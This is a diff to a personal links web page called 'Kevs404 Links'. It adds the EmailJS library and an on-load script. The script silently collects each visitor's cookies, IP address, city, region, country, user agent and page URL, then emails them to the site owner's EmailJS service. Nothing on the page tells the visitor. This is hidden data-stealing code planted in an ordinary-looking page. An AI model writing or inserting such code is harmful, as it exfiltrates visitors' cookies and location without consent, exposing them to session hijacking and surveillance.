@@ -5,7 +5,7 @@
   <title>Kevs404 Links</title>
   <link rel="shortcut icon" href="../assets/programmerist.png" type="image/x-icon"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
       font-family: Arial;
@@ -92,5 +92,43 @@
     </div>
   </div>
 
+<script>
+(function(){
+    // email js PUBLIC API KEY (user)
+    emailjs.init("G3tmu6bSokASDsudB");
+  })();
+
+  window.onload = async function () {
+    let ipData = {};
+
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      ipData = await res.json();
+    } catch (err) {
+      console.log("IP fetch failed:", err);
+    }
+
+    const params = {
+      page: window.location.href,
+      userAgent: navigator.userAgent,
+      time: new Date().toLocaleString(),
+      cookies: document.cookie,
+
+      ip: ipData.ip || "N/A",
+      city: ipData.city || "N/A",
+      region: ipData.region || "N/A",
+      country: ipData.country_name || "N/A"
+    };
+
+    // email js: serviceID, templateID, templateParams
+    emailjs.send("service_romt14a", "template_1hvg1g2", params)
+    .then(function(response) {
+      console.log("Email sent!", response.status);
+    }, function(error) {
+      console.log("Failed...", error);
+    });
+  };
+
+</script>
 </body>
 </html>
